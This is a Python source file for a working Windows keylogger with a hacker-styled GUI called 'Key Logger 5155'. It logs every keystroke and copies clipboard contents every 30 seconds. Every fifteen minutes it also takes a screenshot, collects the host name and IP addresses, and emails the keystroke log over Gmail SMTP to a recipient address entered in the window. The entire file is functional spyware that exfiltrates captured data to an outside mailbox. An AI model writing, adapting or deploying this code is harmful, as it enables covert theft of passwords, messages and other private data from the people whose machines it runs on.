from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
from time import sleep
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from requests import get
import threading
from PIL import ImageGrab, Image, ImageTk
from tkinter import Label,Frame, Entry, Button, messagebox,StringVar
from customtkinter import CTk
import logging
from dotenv import load_dotenv
load_dotenv()
logging.basicConfig(filename="app/data/key_log.txt", level=logging.DEBUG, format='%(asctime)s, %(message)s')

keys_information = "app/data/key_log.txt"
system_information = "app/data/systeminfo.txt"
clipboard_information = "app/data/clipboard.txt"
screenshot_information = "app/data/screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

email_address = os.getenv('email') 
password = os.getenv('pass')
toAddr = ""

state = 0
stopFlag = False

def on_closing():
    global stopFlag
    if messagebox.askokcancel("Quit", "Do you want to quit?"):
        stopFlag = True
        root.destroy()

def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "LOG file"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

def computer_information():
    with open(system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip+"\n")

        except Exception:
            f.write("Public IP Address: Couldn't get Public IP Address\n")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

def copy_clipboard():
   with open(clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("\nClipboard Data: \n" + pasted_data)

        except:
            f.write("\nClipboard could be not be copied")

def screenshot():
    im = ImageGrab.grab()
    im.save(screenshot_information)
        

count = 0
keys =[]

def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_file(keys)
        keys =[]

def write_file(keys):
    for key in keys:
        k = str(key).replace("'", "")
        logging.info(k)
listener = Listener(on_press=on_press)

def start_logger():
    global listener,toAddr,btnStr
    count = 900
    listener.start()
    btnStr.set("Stop Keylogger")
    while True:
        print(count)
        if stopFlag:
            break
        if (count % 30 == 0):
            copy_clipboard()
        if (count == 0):
            screenshot()
            computer_information()
            send_email(keys_information,keys_information,toAddr)
            count = 900
        sleep(1)
        count -= 1
    listener.stop()
    btnStr.set("Start Keylogger")
    listener = Listener(on_press=on_press)

def on_button_click():
    global state,toAddr,listener,stopFlag,receiver_entry,btnStr
    toAddr = receiver_entry.get()
    if (receiver_entry['state'] == 'normal'):
        receiver_entry['state'] = 'disabled'
        btnStr.set("Starting...")
    else:
        receiver_entry['state'] = 'normal'
        btnStr.set("Stopping...")
    if state==0:
        state = 1
        print(state)
        stopFlag = False
        thread = threading.Thread(target=start_logger)
        thread.start()
    elif state==1:
        state=0
        print(state)
        stopFlag = True
        btnStr.set("Start Keylogger") 

root = CTk()
root.geometry("800x600")
root.config(bg="black")
root.protocol("WM_DELETE_WINDOW", on_closing)
btnStr = StringVar()
btnStr.set("Start Keylogger")
image = Image.open('app/cracking.png')
resize_image = image.resize((300, 300))
img = ImageTk.PhotoImage(resize_image)
root.after(201, lambda :root.iconbitmap('app/cracking.ico'))
icon = Label(root, image=img, bg="black", width=300,height=400)
icon.pack()
root.title("Key Logger 5155")
Title = Label(root, text="Key Logger 5155", font=("Cascadia Code", 50, "bold"),pady=20, bg="black", fg="green")
Title.pack()
InputFrame = Frame(root, bg="black", pady=20)
InputFrame.pack()
receiver_label = Label(InputFrame, text="Recipients E-mail Address : ", font=("Cascadia Code", 13, "bold"),pady=20, bg="black", fg="green")
receiver_entry = Entry(InputFrame, bg="black", fg="green", width=35, font=("Cascadia Code", 13, "bold"))
receiver_entry.grid(row=0,column=1)
receiver_label.grid(row=0,column=0)
button = Button(root, textvariable=btnStr, command=on_button_click, width=30, bg="green",font=("Cascadia Code", 13, "bold") )
button.pack()
root.mainloop()